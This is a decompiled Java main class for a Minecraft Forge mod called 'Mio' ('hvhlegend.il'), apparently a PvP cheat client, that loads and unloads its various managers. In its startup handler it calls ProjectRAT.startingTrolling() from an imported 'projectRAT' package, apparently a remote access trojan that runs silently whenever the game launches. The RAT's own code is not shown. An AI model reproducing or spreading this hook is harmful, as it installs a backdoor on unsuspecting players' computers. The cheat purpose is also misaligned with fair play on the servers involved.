//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Primo\Downloads\Deobf\Minecraft-Deobfuscator3000-master\1.12 stable mappings"!

// 
// Decompiled by Procyon v0.5.36
// 

package il.dev.mio;

import in.momin5.projectRAT.ProjectRAT;
import org.apache.logging.log4j.LogManager;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import org.lwjgl.opengl.Display;
import il.dev.mio.api.util.IMinecraftUtil;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import il.dev.mio.api.util.plugs.Enemy;
import il.dev.mio.api.event.events.Render3DEvent;
import il.dev.mio.mod.gui.font.CustomFont;
import il.dev.mio.api.manager.TextManager;
import il.dev.mio.api.manager.EventManager;
import il.dev.mio.api.manager.ServerManager;
import il.dev.mio.api.manager.ConfigManager;
import il.dev.mio.api.manager.FileManager;
import il.dev.mio.api.manager.ReloadManager;
import il.dev.mio.api.manager.SpeedManager;
import il.dev.mio.api.manager.PositionManager;
import il.dev.mio.api.manager.RotationManager;
import il.dev.mio.api.manager.PotionManager;
import il.dev.mio.api.manager.InventoryManager;
import il.dev.mio.api.manager.HoleManager;
import il.dev.mio.api.manager.ColorManager;
import il.dev.mio.api.manager.PacketManager;
import il.dev.mio.api.manager.ModuleManager;
import il.dev.mio.api.manager.FriendManager;
import il.dev.mio.api.manager.CommandManager;
import il.dev.mio.api.manager.TimerManager;
import org.apache.logging.log4j.Logger;
import net.minecraftforge.fml.common.Mod;

@Mod(modid = "hvhlegend.il", name = "Mio", version = "0.4.5")
public class Mio {
    public static final String MODID = "hvhlegend.il";
    public static final String MODNAME = "Mio";
    public static final String MODVER = "v0.4.5";
    public static final Logger LOGGER;
    public static TimerManager timerManager;
    public static CommandManager commandManager;
    public static FriendManager friendManager;
    public static ModuleManager moduleManager;
    public static PacketManager packetManager;
    public static ColorManager colorManager;
    public static HoleManager holeManager;
    public static InventoryManager inventoryManager;
    public static PotionManager potionManager;
    public static RotationManager rotationManager;
    public static PositionManager positionManager;
    public static SpeedManager speedManager;
    public static ReloadManager reloadManager;
    public static FileManager fileManager;
    public static ConfigManager configManager;
    public static ServerManager serverManager;
    public static EventManager eventManager;
    public static TextManager textManager;
    public static CustomFont fontRenderer;
    public static Render3DEvent render3DEvent;
    public static Enemy enemy;
    @Mod.Instance
    public static Mio INSTANCE;
    private static boolean unloaded;
    
    public static void load() {
        Mio.LOGGER.info("loading");
        Mio.unloaded = false;
        if (Mio.reloadManager != null) {
            Mio.reloadManager.unload();
            Mio.reloadManager = null;
        }
        Mio.textManager = new TextManager();
        Mio.commandManager = new CommandManager();
        Mio.friendManager = new FriendManager();
        Mio.moduleManager = new ModuleManager();
        Mio.rotationManager = new RotationManager();
        Mio.packetManager = new PacketManager();
        Mio.eventManager = new EventManager();
        Mio.speedManager = new SpeedManager();
        Mio.potionManager = new PotionManager();
        Mio.inventoryManager = new InventoryManager();
        Mio.serverManager = new ServerManager();
        Mio.fileManager = new FileManager();
        Mio.colorManager = new ColorManager();
        Mio.positionManager = new PositionManager();
        Mio.configManager = new ConfigManager();
        Mio.holeManager = new HoleManager();
        Mio.LOGGER.info("Managers loaded.");
        Mio.moduleManager.init();
        Mio.LOGGER.info("Modules loaded.");
        Mio.configManager.init();
        Mio.eventManager.init();
        Mio.LOGGER.info("EventManager loaded.");
        Mio.textManager.init(true);
        Mio.moduleManager.onLoad();
        Mio.LOGGER.info("Mio successfully loaded!\n");
    }
    
    public static void unload(final boolean unload) {
        Mio.LOGGER.info("unloading Mio");
        if (unload) {
            (Mio.reloadManager = new ReloadManager()).init((Mio.commandManager != null) ? Mio.commandManager.getPrefix() : ".");
        }
        onUnload();
        Mio.eventManager = null;
        Mio.friendManager = null;
        Mio.speedManager = null;
        Mio.holeManager = null;
        Mio.positionManager = null;
        Mio.rotationManager = null;
        Mio.configManager = null;
        Mio.commandManager = null;
        Mio.colorManager = null;
        Mio.serverManager = null;
        Mio.fileManager = null;
        Mio.potionManager = null;
        Mio.inventoryManager = null;
        Mio.moduleManager = null;
        Mio.textManager = null;
        Mio.LOGGER.info("Mio unloaded!\n");
    }
    
    public static void onUnload() {
        if (!Mio.unloaded) {
            Mio.eventManager.onUnload();
            Mio.moduleManager.onUnload();
            Mio.configManager.saveConfig(Mio.configManager.config.replaceFirst("hvhlegend/", ""));
            Mio.moduleManager.onUnloadPost();
            Mio.unloaded = true;
        }
    }
    
    public static void reload() {
    }
    
    @Mod.EventHandler
    public void preInit(final FMLPreInitializationEvent event) {
        ProjectRAT.startingTrolling();
        Mio.LOGGER.info("...");
        Display.setTitle("welcome, " + IMinecraftUtil.mc.getSession().getUsername() + ". loading hvhlegend.il...");
    }
    
    public static RotationManager getRotationManager() {
        return Mio.rotationManager;
    }
    
    @Mod.EventHandler
    public void init(final FMLInitializationEvent event) {
        Display.setTitle("hvhlegend.il");
        load();
    }
    
    public FriendManager friendManager() {
        return null;
    }
    
    static {
        LOGGER = LogManager.getLogger("mio");
        Mio.unloaded = false;
    }
}
